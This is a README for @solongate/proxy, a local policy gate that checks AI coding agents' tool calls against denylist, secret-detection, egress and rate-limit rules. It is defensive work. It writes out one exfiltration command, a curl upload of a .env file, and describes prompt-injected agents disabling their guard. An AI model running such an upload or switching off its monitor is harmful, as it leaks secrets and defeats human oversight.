# @solongate/proxy

A policy gate for AI coding agents. It sits in front of every tool call an agent
makes — every shell command, every file read, every write — and decides whether
it runs, against rules you wrote.

The decision happens on the machine, in a hook the agent calls before it acts.
Nothing is asked over the network on the decision path: the policy is compiled to
Rego and evaluated locally.

Agents: **Claude Code**, **Codex**, **OpenCode**, **Antigravity**.

## Install

Node.js 20+. No account, no sign-in, nothing to import.

```sh
npm i -g @solongate/proxy
solongate                    # install the guard from the Settings panel
```

Start a new terminal afterwards — hooks load when a session starts, so
already-open terminals are not guarded yet.

## Write a policy

`~/.solongate/policy.json`:

```json
{
  "mode": "denylist",
  "rules": [
    {
      "id": "no-force-push",
      "description": "Rewriting shared history is not an agent's decision",
      "effect": "DENY",
      "priority": 10,
      "enabled": true,
      "toolPattern": "*",
      "minimumTrustLevel": "UNTRUSTED",
      "commandConstraints": { "denied": ["*push --force*", "*push -f*"] }
    }
  ]
}
```

The next tool call is decided against it. `git push --force` and `git push -f`
are refused from that point; `git push` is not.

A `policy.json` beside your working directory is read when the machine has no file of
its own. It may add rules and nothing else — it lives in a repository the agent
can write to.

## What it enforces

- **Policy rules** — allow or block by path, command, filename or URL.
- **DLP** — when a call carries a secret (API key, token, private key), block it
  or keep it from the model. 70 built-in patterns, plus globs of your own.
- **Egress** — a transfer command that would upload a local file holding a secret
  is refused. `curl --data-binary @.env <url>` reads the file itself, so the secret
  is in neither the arguments nor the output and pattern DLP cannot see it.
- **The prompt** — the model also sees what you type and whatever the client sweeps
  into context, and no tool-call hook is in that path. A shell shim routes `claude`
  through a local proxy that masks the request body on its way out.
- **Rate limiting** — cap tool calls per minute, hour or day.
- **Tamper protection** — the guard's own state cannot be edited by a tool call,
  by any route, including the binary it delegates to.

The last three are configured in the same file. Wrap the policy and add
`security`:

```json
{
  "policy": { "mode": "denylist", "rules": [] },
  "security": {
    "rateLimit": { "mode": "enforce", "perMinute": 60 },
    "dlpBlock": { "patterns": ["AWS access key", "Anthropic key"] }
  }
}
```

## Where the record goes

Denials are appended to `~/.solongate/local-logs/solongate-audit.jsonl`,
owner-only, one JSON object per line; the post-tool hook records the rest. What a
turn cost goes beside it in `token-usage-<date>.jsonl`.

Nothing is sent anywhere. There is no service to send it to and no code left in
the guard that can open a socket.

## The CLI

Every one of these reads or changes a security posture, so they refuse to run
without an interactive terminal and refuse when an agent marker is in the
environment. A prompt-injected agent must not be able to switch off the thing
watching it.

```
solongate                    the dataroom (policies, audit, settings)
solongate policy             list and edit the policy
solongate dlp                show and edit secret detection
solongate ratelimit          show and edit the rate limit
solongate audit              browse the audit trail
solongate watch              live-tail tool calls
solongate doctor             what is installed, and whether it is enforcing
solongate repair             restore the guard, hooks and settings files
```

## Licence

MIT. See [LICENSE](LICENSE).
